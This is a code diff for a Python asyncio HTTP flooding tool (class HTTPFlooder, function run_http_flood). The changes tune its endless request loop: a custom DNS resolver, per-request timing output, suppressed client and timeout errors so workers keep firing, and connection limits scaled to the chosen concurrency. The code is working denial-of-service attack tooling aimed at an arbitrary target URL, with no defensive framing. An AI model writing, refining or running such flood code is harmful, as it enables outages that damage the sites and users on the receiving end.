@@ -2,11 +2,10 @@ import asyncio
 import os
 import ssl
 from typing import Optional
-from aiohttp import ClientSession, TCPConnector
-
+from aiohttp import ClientSession, TCPConnector, ClientError, AsyncResolver
 from .headres import getHeaders
 
-from contextlib import suppress
+from contextlib import suppress, asynccontextmanager
 from ..utils.ulog import log
 
 from ..src.cpu_manager import CPUManager
@@ -44,10 +43,13 @@ class HTTPFlooder:
         headers = getHeaders(self.target_url)
 
         log.critical(f"Size headers: {sys.getsizeof(str(headers))} bytes")
+        await asyncio.sleep(2)
 
         # time.sleep(2)
-        await asyncio.sleep(2)
+        resolver = AsyncResolver()
+        
         connector = TCPConnector(
+            resolver=resolver,
             limit=self.concurrency * 2,
             limit_per_host=self.concurrency,
             ssl=self.ssl_context,
@@ -77,6 +79,16 @@ class HTTPFlooder:
 
 
     # :)
+    @staticmethod
+    @asynccontextmanager
+    async def timeit(worker_label):
+        now = time.monotonic()
+        try:
+            yield
+        finally:
+            print(f"[t] {worker_label} | req took: {time.monotonic() - now:.2f}s to run")
+            
+
     async def send_http_request(
             self,
             worker_id: int,
@@ -90,31 +102,27 @@ class HTTPFlooder:
 
         while True:
             async with sem:
-                try:
+                with suppress(ClientError, asyncio.TimeoutError):
                     if self.sleep_time > 0:
                         await asyncio.sleep(self.sleep_time)
                     if not self.session:
                         raise RuntimeError("HTTP session is not initialized.")      
                     
-                    
-                    async with method_func(
-                            self.target_url, 
-                            timeout=10,
-                            ssl=self.ssl_context
-                    ) as response:
-                        await response.release()
-                        status = response.status
+                    async with self.timeit(worker_label):
 
-                        if status >= 400:
-                            print(f"{worker_label} Error: {status}")
 
-                except asyncio.CancelledError:
-                    break
-                except Exception as e:
-        
-                    await asyncio.sleep(1)
-                    continue
+                        async with method_func(
+                                self.target_url, 
+                                timeout=10,
+                                ssl=self.ssl_context
+                        ) as response:
+                            await response.release()
+                            status = response.status
 
+                            if status >= 400:
+                                print(f"{worker_label} Error: {status}")
+
+                
 async def run_http_flood(
         target_url: str,
         concurrency: int,
